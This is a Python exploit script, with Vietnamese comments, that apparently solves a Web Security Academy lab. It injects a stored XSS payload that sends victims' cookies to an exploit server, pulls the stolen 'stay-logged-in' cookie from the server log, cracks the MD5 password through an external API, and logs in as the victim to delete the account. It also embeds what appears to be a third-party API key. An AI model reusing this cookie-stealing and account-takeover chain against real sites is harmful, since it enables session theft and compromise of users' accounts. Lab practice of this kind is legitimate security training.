'''
XSS trong bình luận để ăn cắp cookie của carlos .
<script>document.location='https://exploit-ace21f6b1e44bf62c03444b201340054.web-security-academy.net'+document.cookie</script>
Phân tích cookie -> get password -> login -> delete acount.
'''

import requests
import re
import base64

def decode_md5(md5):
	url_md5 = 'https://md5decrypt.net/en/Api/api.php'
	email = 'cp0830992@gmail.com'
	key = 'd2190f7e1ccbf8f5'
	hash_type = 'md5'
	payload = {'hash': md5, 'hash_type': hash_type, 'email': email, 'code': key}
	result = requests.get(url_md5, params=payload)
	return result.text

def post_comment():
	url1 = 'https://ac091f641e246ceec091a1ee00cc000f.web-security-academy.net/post/comment'
	xss = "<script>document.location='https://exploit-ac7a1f9f1e166cc7c0bfa1ff013e009a.web-security-academy.net/'+document.cookie</script>"
	data = {"postId":1,"comment": xss,"name": "xss","email": "a@g.com","website":""}
	r = requests.post(url1, data=data) 

def get_cookie():
	url2 = 'https://exploit-ac7a1f9f1e166cc7c0bfa1ff013e009a.web-security-academy.net/log'
	r1 = requests.get(url2)
	x = re.findall("stay-logged-in=\w*", r1.text)
	return x[0][15:]

def decode_base64(i):
	base64_bytes = i.encode("ascii")
	sample_string_bytes = base64.b64decode(base64_bytes)
	sample_string = sample_string_bytes.decode("ascii")
	return sample_string

def slove(c):
	s = requests.Session()
	url3 = 'https://ac091f641e246ceec091a1ee00cc000f.web-security-academy.net/login'
	acc = c.split(':')
	data = {"username": acc[0] ,"password": decode_md5(acc[1])}
	r3 = s.post(url3, data=data)
	data2 = {"password": decode_md5(acc[1])}
	r4 = s.post("https://ac091f641e246ceec091a1ee00cc000f.web-security-academy.net/my-account/delete", data=data2)
	print(r4.text)

post_comment()
slove(decode_base64(get_cookie()))